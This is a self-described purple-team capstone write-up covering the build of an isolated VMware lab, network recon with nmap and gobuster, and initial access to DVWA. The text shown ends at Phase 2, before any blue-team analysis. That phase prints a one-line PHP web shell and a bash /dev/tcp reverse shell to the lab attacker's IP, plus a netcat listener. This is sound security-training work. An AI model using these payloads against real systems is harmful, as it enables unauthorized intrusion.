# Purple Team Capstone Writeup 
**Environment:** VMware Workstation Pro, 4-VM isolated lab  
**Goal:** Simulate a full corporate network breach, data exfiltration, and blue team detection at every phase  
**Attacker:** Kali Linux | **Target Network:** Ubuntu (DVWA) + Metasploitable3 | **SIEM:** Splunk (separate Ubuntu Machine)

---

## What Is This?

This is a self-designed purple team capstone project. In the contect of cybersecurity, "purple team" means I'll roleplay both attacker (red team) and defender (blue team). The attack chain runs from initial recon all the way through lateral movement and data exfiltration. After each attack phase, I switch hats and analyze the logs in Splunk to see from a defender's POV.

The fictional scenario: I'm an external attacker who has compromised a company's DMZ server and is working my way deeper into the internal network.

This write-up documents the setup and EXTENSIVE troubleshooting, the attacks, the detections, and everything I learned along the way, including the problems I hit and how I solved them. My hope is for this doc to be readable by someone without a deep technical background.

---

## Lab Architecture

```
[Kali — Attacker]         [Splunk — SIEM]
  192.168.100.10            192.168.100.30
        |                         |
        |-------- VMnet1 (192.168.100.x / DMZ) ---------|
                                  |
                         [Ubuntu — DVWA]
                           192.168.100.20  <-- DMZ-facing
                           192.168.200.20  <-- Internal-facing (pivot point)
                                  |
                        VMnet2 (192.168.200.x / Internal)
                                  |
                    [Metasploitable3 — Internal Server]
                           192.168.200.10
```

**Why this layout matters:** Kali can only see the 100.x network. I think of it like a video game mission; I've been dropped into the environment I plan to attack, it's up to me to find a way in. Metasploitable3 only lives on the 200.x network. The only path from Kali to Metasploitable3 is through Ubuntu,  which has one foot (network adapter) in each network. This forces *lateral movement*, which is how real attackers move deeper into a company after getting an initial foothold.

**VMs used:**

| Machine | Role | OS | IP(s) |
|---|---|---|---|
| Kali Linux | Attacker | [redacted] | 192.168.100.10 |
| Ubuntu + DVWA | DMZ web server / pivot | Ubuntu 22.04 | 192.168.100.20 / 192.168.200.20 |
| Metasploitable3 | Internal legacy server | Ubuntu 14.04 | 192.168.200.10 |
| Splunk | SIEM / log collector | Ubuntu 22.04 | 192.168.100.30 |

---

## Phase 0: Lab Setup

This phase was purely infrastructure, involving me building the lab from scratch before any attacks happen. It took longer than expected and threw a lot of problems, most of which taught me something useful. Frankly: it was a pain. But the good kind.

### What I built and why

Four virtual machines running on my Windows laptop via VMware Workstation. VMware is a hypervisor; meaning it's software that tricks your laptop's hardware into thinking it's running multiple separate computers at once. Each VM gets its own slice of RAM, CPU, and storage. They behave like real physical machines but they're just files on your hard drive.

Two isolated virtual networks were created in VMware's Virtual Network Editor: VMnet1 (the DMZ, 192.168.100.x) and VMnet2 (the internal network, 192.168.200.x). "Host-only" means these networks exist only inside VMware — no internet access, no connection to anything real. The VMs can only talk to each other. That said, they WERE given NAT adapters at some point in the process, as the tools I needed couldn't be installed without web access. Best practice, though, is to keep everything as host-only.

### Ubuntu + DVWA Setup

DVWA (Damn Vulnerable Web App) is a deliberately broken web application used for practice. It needs three things to run: Apache (the web server that handles HTTP requests), PHP (the scripting language that makes the app work), and MySQL (the database that stores user accounts and data).

**Problem: apt couldn't install packages**

`apt` is Ubuntu's package manager — basically an app store for Linux that downloads and installs software automatically. When I ran the install command, it silently skipped MySQL. Ubuntu was on a host-only network with no internet access, so apt couldn't reach the package repositories.

**Fix:** Added a temporary NAT adapter so the VM could reach the internet. NAT (Network Address Translation) routes the VM's traffic through the host machine's (i.e. my laptop) internet connection. Once packages were installed, the NAT adapter was removed.

**Problem: NAT adapter existed but had no IP**

The VM had the adapter but Ubuntu's network config (netplan) didn't know about it so it ignored it. Netplan is Ubuntu's network configuration system; it reads a YAML file that tells it how to configure each adapter. If an adapter isn't in the file, Ubuntu does nothing with it.

**Fix:** edited `/etc/netplan/*.yaml` to add the new adapter with `dhcp4: true`, then ran `sudo netplan apply`. This told Ubuntu "when you see this adapter, request an IP via DHCP." DHCP = auto IP address assignment 

**Problem: DVWA setup page returned HTTP 500**

500 means the server hit an error. After ruling out MySQL connectivity and PHP issues, the fix was changing `db_server` in DVWA's config from `localhost` to `127.0.0.1`. The difference: `localhost` tells PHP to connect via a Unix socket, but MySQL's socket path didn't match. `127.0.0.1` forces TCP instead, which works reliably.

**What I learned about protocols here:** I knew protocols were agreed-upon standards (essentially documents) that define how communication should work between machines. But what finally clicked, is that they don't DO anything by themselves. Apache, Samba, and other applications are the software that actually implement those standards. The protocol is the rule/law; the application is the one following it. Like how citizens follow laws written in legislation, only those laws are just ink on paper; people adhering to them are what give them tangibility. Here, the same applies.

### Metasploitable3 Setup

Metasploitable3 is a deliberately vulnerable VM built by Rapid7 (the company behind Metasploit). I recently attended CyberBay Tampa 2026 and learned a bit more about Rapid7, so using MS3 was a no-brainer. It simulates a neglected internal server, the kind of legacy machine that makes for a good target.

For the purposes of this capstone, metasploitable3 = a file server running Samba on the internal network. Samba is an application that implements the SMB protocol to provide Windows-compatible file sharing on Linux. Employees would see it as a Z:\ drive on their laptops without knowing or caring that it's a Linux box in the server room.

**Why Metasploitable3 instead of Metasploitable2:** Metasploitable2 is a pre-built VM that's been largely abandoned. It had persistent boot issues (initramfs errors, SCSI controller incompatibilities) that made it unreliable. Metasploitable3 is built fresh using Vagrant (Infrastructure as Code).

**What is Infrastructure as Code (IaC)?**

From what I understand, instead of manually clicking through a setup wizard, you write/paste a file that describes exactly what you want and a tool builds it automatically. Vagrant reads a `Vagrantfile` (a recipe) and builds the VM for you; meaning, it downloads the base OS image, configures the hardware, installs software. The result is identical every time. The main pro being reduced human-error in architecture setup.

This is the same philosophy behind tools like Terraform, Ansible, and Docker. They all solve the same problem: doing things manually at scale is slow, inconsistent, and error-prone.

**Setup process:**
1. Installed Vagrant and the vagrant-vmware-desktop plugin on the Windows host
2. Cloned the Metasploitable3 repository from GitHub
3. Ran `vagrant up --provider=vmware_desktop` from the project directory
4. Vagrant downloaded the base box and built the VM automatically in VMware

**Static IP and routing:** Metasploitable3 was assigned `192.168.200.10` on VMnet2 via `/etc/network/interfaces`. Fake sensitive data was planted at `/opt/corpnet/finance/employee_records.csv` which is just a CSV with fake employee names, salaries, and SSNs. This is what gets exfiltrated in Phase 5. If this were a CTF, it'd be my flag.

### Splunk Setup

For this project, I opted for the free trial of Splunk Enterprise. Splunk is a SIEM (Security Information and Event Management) system. It collects logs (logs are just receipts for device/network activity) from machines across the network, indexes them, and lets you search and alert on suspicious activity. In a real company, this is how the blue team sees what's happening; every login, every network connection, every command executed gets shipped to Splunk. 

**Universal Forwarder:** A lightweight agent installed on each target machine that watches specific log files and ships new entries to Splunk in real time. Installed on both Ubuntu and Metasploitable3, pointed at `192.168.100.30:9997` (Splunk's listening port for incoming log data).

**Problem: Metasploitable3 forwarder couldn't reach Splunk**

Metasploitable3 is on the 200.x network. Splunk is on the 100.x network. They're on different subnets with no direct path between them.

The fix required two static routes:
- On Metasploitable3: route 192.168.100.x traffic through Ubuntu (via 192.168.200.20)
- On Splunk: route 192.168.200.x traffic through Ubuntu (via 192.168.100.20)
- On Ubuntu: enable IP forwarding (`net.ipv4.ip_forward=1`) so it actually passes traffic between its two adapters instead of dropping it

Ubuntu acts as the router between the two networks. Without IP forwarding enabled, Ubuntu receives the packets but drops them because they're addressed to someone else. With it enabled, it passes them along.

Both routes were made permanent: the Metasploitable3 route in `/etc/network/interfaces` using `post-up`, and the Splunk route in netplan.

**Verifying log flow in Splunk:**

```
index=_internal source=*metrics.log group=tcpin_connections | stats count by hostname
```

Breaking this down: `index=_internal` searches Splunk's own internal logs. `group=tcpin_connections` filters for records of incoming TCP connections from forwarders. The pipe `|` means "take these results and do something with them." `stats count by hostname` collapses the results into a clean summary, with one row per connected machine. Both `ubuntudvwa` and `metasploitable3-ub1404` appeared, confirming logs were flowing.

**Two final notes on connecting Splunk**
1. Splunk uses SPL (search processing language), a query language similar to SQL's own search query language. 

2. Configuring static routes wasn't entirely necessary. With NAT enabled, routes to and fro were automatically enabling log forwarding. However, host-only is best-practice when it comes to the security of this capstone. So this extra configuration—albeit a pain in the behind—was optimal and good practice.


### Key Takeaways from Phase 0

- **Networks don't configure themselves.** Even in a simple 4-VM lab, routing between subnets requires explicit configuration. IP forwarding, static routes, and gateway settings all have to be right or traffic silently goes nowhere. Most of the time spent on getting this practice-environment setup comprised of basic network troubleshooting and connectivity issues. That should tell you how important networking is.
- **Protocols vs. applications.** HTTP, SMB, TCP are *standards*...documents that define how communication should work. Apache, Samba, and other software are what actually implement them. Knowing this distinction makes troubleshooting significantly easier.
- **IaC is everywhere.** Vagrant, Terraform, Ansible, Docker all solve the same problem from different angles: replace manual, inconsistent human configuration with reproducible code. This is the direction the industry has moved and it's been difficult yet rewarding to understand.
- **Static routes don't persist by default.** `ip route add` is temporary — it survives until the next reboot. To make routing permanent it has to live in netplan or `/etc/network/interfaces`.

---

## Phase 1: Reconnaissance

*MITRE ATT&CK: T1046 Network Service Discovery, T1595 Active Scanning*

If you're robbing a bank, you don't just grab a weapon, walk in, and hope for the best. "I'll figure it out" isn't a strategy. You do your research, map it out, and know what you're walking into. In otherwords, you perform recon: understand what's running, what versions, and what attack surface exists. Act based off of that info.

### 1.1 — Full Port Scan

```
nmap -sS -sV -sC -p- -T4 192.168.100.20 -oN Recon/nmap_full.txt
```
**Network Mapper** (namp) is exactly what you'd think it is: a tool to "map out" network infrastructure. It comes pre-loaded on most machines, including my Kali attack box.

Flag breakdown:
- `-sS` — SYN (or STEALTH) scan. Sends the first packet of a TCP handshake but never completes it. Stealthier than a full connect scan because it never establishes a full three-way-handshake session, making it harder to log.
- `-sV` — detect the exact version of each service. Not just "SSH" but "OpenSSH 9.6p1." Version numbers will make researching CVEs easier.
- `-sC` — run nmap's default scripts. These automatically check for common misconfigurations and grab banners, HTTP headers, SSH key info, etc.
- `-p-` — scan all 65,535 ports. The default nmap scan only covers the top 1,000. Services can hide on high ports, so no stone left unturned.
- `-T4` — aggressive timing. Sends packets faster, which shortens scan time but generates more noise. In a real engagement you'd maybe use `-T2` or `-T3` to stay under IDS (intrustion detection system) radar. `-T2` is slow and stealthy; `-T3` is a moderate middle ground that some professionals use on real engagements. I chose `-T4` intentionally as this is a purple team project, and the goal is to generate detectable traffic for the blue team phase. The noise is what I want to see.
- `-oN` — save output to a file. Best practice is to save your raw output in case you reference it later.

**Results:**

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache httpd 2.4.58 |

Only two open ports. Although I expected port 3306 (MySQL) to be open, it wasn't visible because MySQL is bound to `127.0.0.1` (localhost only). It accepts connections from the machine itself but refuses external connections entirely. nmap only sees what's exposed to the network. The full picture of what's running locally only becomes visible once I've compromised the machine.

### 1.2 — Web Directory Enumeration

I know port 80 is open. Serving HTTP. Before attacking the web app, I'll map its structure with Gobuster: a tool used to find every accessible directory and file (also included with Kali).

```
gobuster dir -u http://192.168.100.20/dvwa/ -w /usr/share/wordlists/dirb/common.txt -o Recon/gobuster.txt
```

Flag breakdown:
- `dir` — directory/file brute-forcing mode. Gobuster also has `dns` (subdomain enumeration) and `vhost` modes; `dir` is for mapping web server content. If I wanted to find something like "shop.http://website.com" I'd use `dns` for that.
- `-u` — target URL.
- `-w` — wordlist. Gobuster takes this list of common directory and file names and tries each one against the target. If the server responds with anything other than a 404, it gets reported as found. `dirb/common.txt` ships with Kali, so no installation needed.
- `-o` — save output to a file. Just like `oN` above.

**A note on the target URL:** The scan was run directly against `/dvwa/` because the DVWA application was already known from setup. In a real engagement you wouldn't know this upfront. The correct approach would be to run Gobuster against the root URL (`http://192.168.100.20/`) first, discover `/dvwa/` as a result, and then enumerate inside it. This lab skips that discovery step since the application was installed by hand.

**Key findings:**

| Path | Status | Notes |
|---|---|---|
| `/.git/HEAD` | 200 | Exposed git repository — critical finding |
| `/.htaccess` | 403 | Exists but blocked |
| `/config` | 301 | App config directory |
| `/database` | 301 | Contains SQL files and database schema |
| `/php.ini` | 200 | PHP config file exposed — readable |
| `/robots.txt` | 200 | Standard exclusion file |

The most significant finding: `/.git/HEAD` returned 200. An exposed `.git` directory means the entire version history of the codebase is accessible from the web. An attacker can reconstruct full source code, find hardcoded credentials, recover "deleted" sensitive files from old commits, and map the application's logic in detail. This is consistently one of the highest-severity findings in real-world web application assessments. It wasn't the chosen attack vector for this exercise, but it would be flagged as critical in any professional pentest report.

`/php.ini` being readable revealed that `allow_url_include` is set to `On`, which is a dangerous misconfiguration that confirms PHP file inclusion attacks would be possible. Again, not the attack vector, but interesting to learn about.

### 1.3 — Manual Application Exploration and Attack Surface Summary

Browsed to DVWA and reviewed all available vulnerability modules. Default credentials (`admin` / `password`) gained access.

**Attack surface summary:**

Target is running Apache 2.4.58 on port 80 with DVWA installed. SSH is available on port 22 but no credentials are known. The primary attack vector is the DVWA File Upload module, which accepts unrestricted file uploads and stores them in a web-accessible directory. Because Apache is configured to execute PHP, uploading a malicious PHP file and browsing to it achieves remote code execution (RCE) on the server. Secondary findings include an exposed `.git` repository and a readable `php.ini` confirming dangerous PHP settings are enabled.

---

## Phase 2: Initial Access — Web Shell and Reverse Shell

*MITRE ATT&CK: T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter*

### Why not Metasploit?

Metasploit is a framework that automates exploitation; powerful, but it abstracts away what's actually happening. I've used it, and I like it, but doing this manually means understanding the mechanics. I've learned that in a real engagement, you often can't use Metasploit anyway: some clients prohibit it, some environments detect it. Knowing the manual approach makes you a better practitioner regardless of what tools are available. I also firmly believe that understanding manual application makes you a more efficient user of its automated upgrade.

### 2.1 — Crafting the Web Shell

In a kali terminal, I ran:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

This is a one-line PHP web shell. Breaking it down: `system()` is a PHP function that executes operating system commands. `$_GET["cmd"]` reads the value of a URL parameter called `cmd`. So when you browse to this file and pass `?cmd=whoami`, PHP runs `whoami` on the server's operating system and prints the output back to your browser. One line, full command execution.

### 2.2 — Uploading the Web Shell

DVWA's file upload module has no meaningful validation; meaning, it accepts files without checking their actual content. The upload was straightforward once the PHP GD image processing library was installed on the server (it was missing, causing DVWA to reject all uploads regardless of security level).

**Why this works:** Two conditions have to be true simultaneously. First, the application doesn't validate file uploads properly. Second, the server executes PHP in uploaded files. Remove either condition and the attack fails. A properly configured server would either reject the upload, store it outside the web root, or refuse to execute non-image content. All three mitigations were absent here.

DVWA confirmed: `successfully uploaded` and stored at `/dvwa/hackable/uploads/`.

### 2.3 — Confirming Remote Code Execution

Browsed to the uploaded file with a test command:

```
http://192.168.100.20/dvwa/hackable/uploads/shell.php?cmd=whoami
```

Server returned: `www-data` which is the user Apache runs as. Command execution confirmed. The web shell was working.

Additional verification:
- `?cmd=hostname` → `ubuntudvwa`
- `?cmd=uname+-a` → `Linux ubuntudvwa 6.8.0-106-generic`

### 2.4 — Upgrading to a Reverse Shell

The browser shell works but is clunky; every command requires a URL, there's no interactivity, and it breaks for commands requiring input. Best practice is upgrading to a reverse shell. Instead of connecting to the target, the target connects BACK to Kali. This bypasses firewalls that block inbound connections, since the connection originates from inside the target network.

On Kali, started a listener:

```bash
nc -lvnp 4444
```

`nc` is Netcat: a raw TCP/UDP tool often called the "Swiss Army knife of networking." Here it's listening on port 4444 for any incoming connection. `-l` means listen, `-v` verbose output, `-n` skip DNS resolution, `-p` specify port.

Then, I triggered the reverse shell by passing this command to the web shell via browser:

```
http://192.168.100.20/dvwa/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.10/4444+0>%261'
```

URL-decoded, that command is:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.100.10/4444 0>&1'
```

What I understand: `bash -i` opens an interactive bash shell. `>& /dev/tcp/192.168.100.10/4444` redirects its output to a TCP connection back to Kali on port 4444. `0>&1` redirects input through that same connection. The shell is no longer talking to a keyboard and screen, but to Kali (me) over the network.

Netcat caught the connection. Upgraded to a proper interactive terminal using Python's PTY module:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

The raw reverse shell has no TTY (teletypewriter): the component that handles proper terminal behavior like arrow keys, tab completion, and Ctrl+C. Without it, certain commands break. `pty.spawn()` creates a pseudo-terminal that wraps the shell in something behaving like a real terminal session.

**Result:** Interactive shell as `www-data` on `ubuntudvwa`.

```
www-data@ubuntudvwa:/var/www/html/dvwa/hackable/uploads$
```

`www-data` is the user Apache runs as (it's deliberately restricted). It can read and write web files but can't read sensitive system files, modify system configuration, or set up the SSH tunnel needed for lateral movement. Getting from `www-data` to `root` is the goal of Phase 3.

